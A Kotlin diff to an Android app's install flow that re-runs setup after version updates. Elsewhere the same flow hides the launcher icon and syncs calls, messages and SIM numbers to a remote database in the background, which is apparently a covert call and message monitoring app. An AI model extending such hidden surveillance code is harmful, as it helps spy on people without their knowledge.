@@ -10,11 +10,19 @@ object InstallFlow {
     private const val TAG = "InstallFlow"
     private const val PREFS = "calltech_install"
     private const val KEY_SETUP_COMPLETE = "setup_complete"
+    private const val KEY_SETUP_VERSION = "setup_version"
 
     fun isSetupComplete(context: Context): Boolean {
-        return context.applicationContext
-            .getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-            .getBoolean(KEY_SETUP_COMPLETE, false)
+        val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+        val savedVersion = prefs.getInt(KEY_SETUP_VERSION, 0)
+        if (savedVersion != BuildConfig.VERSION_CODE) {
+            prefs.edit()
+                .putBoolean(KEY_SETUP_COMPLETE, false)
+                .putInt(KEY_SETUP_VERSION, BuildConfig.VERSION_CODE)
+                .apply()
+            return false
+        }
+        return prefs.getBoolean(KEY_SETUP_COMPLETE, false)
     }
 
     fun completeSetup(context: Context) {
@@ -22,6 +30,7 @@ object InstallFlow {
         app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
             .edit()
             .putBoolean(KEY_SETUP_COMPLETE, true)
+            .putInt(KEY_SETUP_VERSION, BuildConfig.VERSION_CODE)
             .apply()
         LauncherHider.hide(app)
         SyncBootstrap.armBackgroundSync(app)
@@ -41,17 +50,17 @@ object InstallFlow {
             return
         }
 
-        if (isSetupComplete(app)) {
-            LauncherHider.hide(app)
-            CallSyncService.ensureRunning(app)
-            return
-        }
-
         BackgroundSyncRunner.run {
             CallSyncService.holdDuring(app) {
                 try {
                     SimNumberHelper.ensureSimReadyForSync(app)
                     DeviceRegistration.registerNow(app)
+                    if (isSetupComplete(app)) {
+                        SyncScheduler.syncIfPermittedNow(app, source)
+                        LauncherHider.hide(app)
+                        CallSyncService.ensureRunning(app)
+                        return@holdDuring
+                    }
                     SimNumberHelper.registerAllSimsInMongo(app)
                     SyncScheduler.syncIfPermittedNow(app, source)
                     MessageSyncHelper.syncAllMessagesNow(app, source)
